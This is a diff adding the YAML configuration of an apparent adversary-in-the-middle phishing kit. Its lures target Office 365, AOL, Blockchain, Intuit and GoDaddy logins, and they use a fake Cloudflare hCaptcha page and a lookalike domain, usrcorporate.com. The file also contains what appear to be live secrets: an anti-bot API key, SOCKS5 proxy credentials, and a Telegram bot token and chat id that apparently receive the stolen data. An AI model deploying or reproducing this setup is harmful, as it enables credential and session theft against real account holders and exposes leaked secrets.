@@ -1,0 +1,86 @@
+adminpage_path: "4663"
+blacklist_mode: "off"
+ip: 127.0.0.1
+killbot_apikey: yUd0-NE_ARm7evyrUBNwTlKLdcB2Nsfa7TdbA-sUwHQjn
+killbot_enabled: false
+lures:
+    - hostname: ""
+      path: /OUdDNTBF
+      redirect_url: ""
+      phishlet: o365
+      template: cloudflare_hcaptcha_plus.html
+      ua_filter: ""
+      info: ""
+      og_title: ""
+      og_desc: ""
+      og_image: ""
+      og_url: ""
+    - hostname: ""
+      path: /WeSopMLz
+      redirect_url: ""
+      phishlet: aol
+      template: cloudflare_hcaptcha_plus.html
+      ua_filter: ""
+      info: ""
+      og_title: ""
+      og_desc: ""
+      og_image: ""
+      og_url: ""
+    - hostname: ""
+      path: /GTmUfRHp
+      redirect_url: ""
+      phishlet: blockchain
+      template: ""
+      ua_filter: ""
+      info: ""
+      og_title: ""
+      og_desc: ""
+      og_image: ""
+      og_url: ""
+    - hostname: ""
+      path: /bnTewaYR
+      redirect_url: ""
+      phishlet: intuit
+      template: ""
+      ua_filter: ""
+      info: ""
+      og_title: ""
+      og_desc: ""
+      og_image: ""
+      og_url: ""
+    - hostname: ""
+      path: /aMJoqAkQ
+      redirect_url: ""
+      phishlet: godaddy
+      template: ""
+      ua_filter: ""
+      info: ""
+      og_title: ""
+      og_desc: ""
+      og_image: ""
+      og_url: ""
+nkpbot_enabled: false
+proxy_address: 188.92.79.110
+proxy_enabled: false
+proxy_password: 6385063e96ae
+proxy_port: 57425
+proxy_type: socks5
+proxy_username: ad44af4ebda4
+redirect_key: vo
+redirect_url: https://outlook.office365.com
+server: localhost
+simplebot_enabled: false
+site_domains:
+    aol: usrcorporate.com
+    blockchain: localhost
+    godaddy: localhost
+    intuit: localhost
+    o365: usrcorporate.com
+sites_enabled:
+    - aol
+    - godaddy
+turnstile_sitekey: 0x4AAAAAAABYJka27VN19cIJ
+verification_key: mf
+verification_token: d88e
+webhook_telegram: 5450973986:AAGPYvdEkeJCqWwOxrRGy4XCdyhz7QXJEtQ/-1001530275751
+webhook_verbosity: 1
